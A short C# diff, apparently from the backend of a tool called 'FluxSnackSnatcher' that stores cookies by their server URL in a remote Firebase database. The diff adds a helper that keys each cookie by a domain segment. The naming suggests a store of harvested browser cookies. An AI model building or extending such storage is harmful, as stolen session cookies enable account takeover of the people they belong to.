@@ -19,7 +19,7 @@ namespace FluxSnackSnatcher.Services
             {
                 await _firebaseClient
                    .Child("cookies")
-                   .Child(cookie.ServerUrl)
+                   .Child(ExtractDomainSegment(cookie.ServerUrl))
                    .PutAsync(cookie);
 
                 return $"Yuumy snack! :3";
@@ -50,6 +50,18 @@ namespace FluxSnackSnatcher.Services
             {
                 throw new Exception($"Erro ao obter cookies: {ex.Message}", ex);
             }
+        }
+
+        public static string ExtractDomainSegment(string url)
+        {
+            var sections = url.Split(".");
+
+            if (sections[0] == "www")
+            {
+                return sections[1];
+            }
+
+            return sections[0];
         }
     }
 }
